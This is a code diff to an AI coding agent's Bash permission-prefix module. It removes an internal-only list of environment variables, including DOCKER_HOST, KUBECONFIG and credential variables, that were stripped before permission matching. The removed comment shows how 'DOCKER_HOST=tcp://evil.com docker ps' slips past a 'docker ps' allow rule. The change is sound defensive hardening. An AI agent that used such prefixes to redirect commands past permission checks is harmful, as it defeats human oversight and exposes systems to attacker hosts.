@@ -87,8 +87,8 @@ export const MAX_SUGGESTED_RULES_FOR_COMPOUND = 5
 
 /**
  * Extract a stable command prefix (command + subcommand) from a raw command string.
- * Skips leading env var assignments only if they are in SAFE_ENV_VARS (or
- * ANT_ONLY_SAFE_ENV_VARS for ant users). Returns null if a non-safe env var is
+ * Skips leading env var assignments only if they are in SAFE_ENV_VARS.
+ * Returns null if a non-safe env var is
  * encountered (to fall back to exact match), or if the second token doesn't look
  * like a subcommand (lowercase alphanumeric, e.g., "commit", "run").
  *
@@ -105,16 +105,14 @@ export function getSimpleCommandPrefix(command: string): string | null {
   if (tokens.length === 0) return null
 
   // Skip env var assignments (VAR=value) at the start, but only if they are
-  // in SAFE_ENV_VARS (or ANT_ONLY_SAFE_ENV_VARS for ant users). If a non-safe
-  // env var is encountered, return null to fall back to exact match. This
+  // in SAFE_ENV_VARS. If a non-safe env var is encountered, return null to
+  // fall back to exact match. This
   // prevents generating prefix rules like Bash(npm run:*) that can never match
   // at allow-rule check time, because stripSafeWrappers only strips safe vars.
   let i = 0
   while (i < tokens.length && ENV_VAR_ASSIGN_RE.test(tokens[i]!)) {
     const varName = tokens[i]!.split('=')[0]!
-    const isAntOnlySafe =
-      process.env.USER_TYPE === 'ant' && ANT_ONLY_SAFE_ENV_VARS.has(varName)
-    if (!SAFE_ENV_VARS.has(varName) && !isAntOnlySafe) {
+    if (!SAFE_ENV_VARS.has(varName)) {
       return null
     }
     i++
@@ -188,9 +186,7 @@ export function getFirstWordPrefix(command: string): string | null {
   let i = 0
   while (i < tokens.length && ENV_VAR_ASSIGN_RE.test(tokens[i]!)) {
     const varName = tokens[i]!.split('=')[0]!
-    const isAntOnlySafe =
-      process.env.USER_TYPE === 'ant' && ANT_ONLY_SAFE_ENV_VARS.has(varName)
-    if (!SAFE_ENV_VARS.has(varName) && !isAntOnlySafe) {
+    if (!SAFE_ENV_VARS.has(varName)) {
       return null
     }
     i++
@@ -267,9 +263,7 @@ function extractPrefixBeforeHeredoc(command: string): string | null {
   let i = 0
   while (i < tokens.length && ENV_VAR_ASSIGN_RE.test(tokens[i]!)) {
     const varName = tokens[i]!.split('=')[0]!
-    const isAntOnlySafe =
-      process.env.USER_TYPE === 'ant' && ANT_ONLY_SAFE_ENV_VARS.has(varName)
-    if (!SAFE_ENV_VARS.has(varName) && !isAntOnlySafe) {
+    if (!SAFE_ENV_VARS.has(varName)) {
       return null
     }
     i++
@@ -372,73 +366,6 @@ const SAFE_ENV_VARS = new Set([
 ])
 
 /**
- * ANT-ONLY environment variables that are safe to strip from commands.
- * These are only enabled when USER_TYPE === 'ant'.
- *
- * SECURITY: These env vars are stripped before permission-rule matching, which
- * means `DOCKER_HOST=tcp://evil.com docker ps` matches a `Bash(docker ps:*)`
- * rule after stripping. This is INTENTIONALLY ANT-ONLY (gated at line ~380)
- * and MUST NEVER ship to external users. DOCKER_HOST redirects the Docker
- * daemon endpoint — stripping it defeats prefix-based permission restrictions
- * by hiding the network endpoint from the permission check. KUBECONFIG
- * similarly controls which cluster kubectl talks to. These are convenience
- * strippings for internal power users who accept the risk.
- *
- * Based on analysis of 30 days of tengu_internal_bash_tool_use_permission_request events.
- */
-const ANT_ONLY_SAFE_ENV_VARS = new Set([
-  // Kubernetes and container config (config file pointers, not execution)
-  'KUBECONFIG', // kubectl config file path — controls which cluster kubectl uses
-  'DOCKER_HOST', // Docker daemon socket/endpoint — controls which daemon docker talks to
-
-  // Cloud provider project/profile selection (just names/identifiers)
-  'AWS_PROFILE', // AWS profile name selection
-  'CLOUDSDK_CORE_PROJECT', // GCP project ID
-  'CLUSTER', // generic cluster name
-
-  // Anthropic internal cluster selection (just names/identifiers)
-  'COO_CLUSTER', // coo cluster name
-  'COO_CLUSTER_NAME', // coo cluster name (alternate)
-  'COO_NAMESPACE', // coo namespace
-  'COO_LAUNCH_YAML_DRY_RUN', // dry run mode
-
-  // Feature flags (boolean/string flags only)
-  'SKIP_NODE_VERSION_CHECK', // skip version check
-  'EXPECTTEST_ACCEPT', // accept test expectations
-  'CI', // CI environment indicator
-  'GIT_LFS_SKIP_SMUDGE', // skip LFS downloads
-
-  // GPU/Device selection (just device IDs)
-  'CUDA_VISIBLE_DEVICES', // GPU device selection
-  'JAX_PLATFORMS', // JAX platform selection
-
-  // Display/terminal settings
-  'COLUMNS', // terminal width
-  'TMUX', // TMUX socket info
-
-  // Test/debug configuration
-  'POSTGRESQL_VERSION', // postgres version string
-  'FIRESTORE_EMULATOR_HOST', // emulator host:port
-  'HARNESS_QUIET', // quiet mode flag
-  'TEST_CROSSCHECK_LISTS_MATCH_UPDATE', // test update flag
-  'DBT_PER_DEVELOPER_ENVIRONMENTS', // DBT config
-  'STATSIG_FORD_DB_CHECKS', // statsig DB check flag
-
-  // Build configuration
-  'ANT_ENVIRONMENT', // Anthropic environment name
-  'ANT_SERVICE', // Anthropic service name
-  'MONOREPO_ROOT_DIR', // monorepo root path
-
-  // Version selectors
-  'PYENV_VERSION', // Python version selection
-
-  // Credentials (approved subset - these don't change exfil risk)
-  'PGPASSWORD', // Postgres password
-  'GH_TOKEN', // GitHub token
-  'GROWTH' + 'BOOK_API_KEY', // sensitive third-party service key
-])
-
-/**
  * Strips full-line comments from a command.
  * This handles cases where Claude adds comments in bash commands, e.g.:
  *   "# Check the logs directory\nls /home/user/logs"
@@ -529,9 +456,7 @@ export function stripSafeWrappers(command: string): string {
     const envVarMatch = stripped.match(ENV_VAR_PATTERN)
     if (envVarMatch) {
       const varName = envVarMatch[1]!
-      const isAntOnlySafe =
-        process.env.USER_TYPE === 'ant' && ANT_ONLY_SAFE_ENV_VARS.has(varName)
-      if (SAFE_ENV_VARS.has(varName) || isAntOnlySafe) {
+      if (SAFE_ENV_VARS.has(varName)) {
         stripped = stripped.replace(ENV_VAR_PATTERN, '')
       }
     }
